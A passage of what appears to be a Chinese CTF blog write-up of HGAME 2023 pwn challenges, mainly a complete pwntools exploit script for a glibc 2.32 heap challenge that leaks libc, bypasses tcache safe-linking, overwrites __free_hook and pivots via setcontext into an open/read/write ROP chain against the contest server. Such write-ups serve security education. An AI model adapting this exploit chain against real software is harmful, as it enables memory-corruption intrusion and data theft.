class="number">4</span>C <span class="number">8B</span> <span class="number">4</span>A <span class="number">30</span>                   mov     r9, [rdx+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">0000000000053175</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">92</span> <span class="number">88</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rdx, [rdx+<span class="number">88</span>h]</span><br><span class="line">.text:<span class="number">0000000000053175</span>                               ; &#125; <span class="comment">// starts at 53030</span></span><br><span class="line">.text:<span class="number">000000000005317</span>C                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">000000000005317</span>C <span class="number">31</span> C0                         xor     eax, eax</span><br><span class="line">.text:<span class="number">000000000005317</span>E C3                            retn</span><br></pre></td></tr></table></figure>

<ul>
<li>需要注意的是，若调用<code>open</code>函数报错，可以尝试<code>pop_rax_ret</code>+<code>syscall</code>进行系统调用。</li>
<li><code>exp</code>如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-3.hgame.lwsec.cn&quot;</span>,<span class="number">30475</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">lb=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-<span class="number">0x12</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">bin_num=lb+<span class="number">1979008</span>+<span class="number">80</span></span><br><span class="line">free_hook=lb+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(bin_num-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">fk=free_hook^key</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(fk))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line">rdi2rdx=lb+<span class="number">0x000000000014b760</span></span><br><span class="line">setcontext=lb+<span class="number">0x5306D</span></span><br><span class="line">ret=lb+<span class="number">0x0000000000026699</span></span><br><span class="line">pop_rdi=lb+<span class="number">0x000000000002858f</span></span><br><span class="line">pop_rsi=lb+<span class="number">0x000000000002ac3f</span></span><br><span class="line">pop_rdx_r12=lb+<span class="number">0x0000000000114161</span></span><br><span class="line">pop_rax=lb+<span class="number">0x0000000000045580</span></span><br><span class="line">syscall=lb+<span class="number">0x00108D55</span></span><br><span class="line">read=lb+libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write=lb+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">heap=key*<span class="number">0x1000</span>+<span class="number">0x1f0</span></span><br><span class="line">edit(<span class="number">7</span>,p64(rdi2rdx))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)+p64(heap))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span>+p64(<span class="number">0</span>)+p64(setcontext)+p64(<span class="number">1</span>)*<span class="number">15</span>+p64(heap+<span class="number">0xc0</span>-<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(heap+<span class="number">0x10</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap+<span class="number">0x28</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(write)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *&#123;&#125;&quot;.format(setcontext))</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h1><h2 id="pwn-3"><a href="#pwn-3" class="headerlink" title="pwn"></a>pwn</h2><h3 id="without-look"><a href="#without-look" class="headerlink" title="without_look"></a>without_look</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/16387344.html">house of apple  by Lynne</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/house-of-botcake/" rel="tag"># house_of_botcake</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/09/02/scanf-hijacker/" rel="prev" title="scanf_attacker？">
      <i class="fa fa-chevron-left"></i> scanf_attacker？
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/01/18/CVE-2018-5767/" rel="next" title="CVE-2018-5767复现">
      CVE-2018-5767复现 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEEK1"><span class="nav-number">1.</span> <span class="nav-text">WEEK1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn"><span class="nav-number">1.1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-overflow"><span class="nav-number">1.1.1.</span> <span class="nav-text">easy_overflow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#choose-the-seat"><span class="nav-number">1.1.2.</span> <span class="nav-text">choose_the_seat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#orw"><span class="nav-number">1.1.3.</span> <span class="nav-text">orw</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#simple-shellcode"><span class="nav-number">1.1.4.</span> <span class="nav-text">simple_shellcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#re"><span class="nav-number">1.2.</span> <span class="nav-text">re</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easyasm"><span class="nav-number">1.2.1.</span> <span class="nav-text">easyasm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easyenc"><span class="nav-number">1.2.2.</span> <span class="nav-text">easyenc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#encode"><span class="nav-number">1.2.3.</span> <span class="nav-text">encode</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEEK2"><span class="nav-number">2.</span> <span class="nav-text">WEEK2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-1"><span class="nav-number">2.1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#YukkuriSay"><span class="nav-number">2.1.1.</span> <span class="nav-text">YukkuriSay</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#editable-note"><span class="nav-number">2.1.2.</span> <span class="nav-text">editable_note</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fast-note"><span class="nav-number">2.1.3.</span> <span class="nav-text">fast_note</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#new-fast-note"><span class="nav-number">2.1.4.</span> <span class="nav-text">new_fast_note</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEEK3"><span class="nav-number">3.</span> <span class="nav-text">WEEK3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-2"><span class="nav-number">3.1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#libc-2-32%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="nav-number">3.1.1.</span> <span class="nav-text">libc-2.32预备知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#safe-note"><span class="nav-number">3.1.2.</span> <span class="nav-text">safe_note</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#large-note"><span class="nav-number">3.1.3.</span> <span class="nav-text">large_note</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#note-context"><span class="nav-number">3.1.4.</span> <span class="nav-text">note_context</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEEK4"><span class="nav-number">4.</span> <span class="nav-text">WEEK4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-3"><span class="nav-number">4.1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#without-look"><span class="nav-number">4.1.1.</span> <span class="nav-text">without_look</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Anza"
      src="/images/Haida.png">
  <p class="site-author-name" itemprop="name">Anza</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">16</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://verf1sh.github.io/" title="https:&#x2F;&#x2F;verf1sh.github.io&#x2F;" rel="noopener" target="_blank">VerF1sh</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://4xwi11.github.io/" title="https:&#x2F;&#x2F;4xwi11.github.io&#x2F;" rel="noopener" target="_blank">4XWi11</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="author" itemprop="copyrightHolder">Anza</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
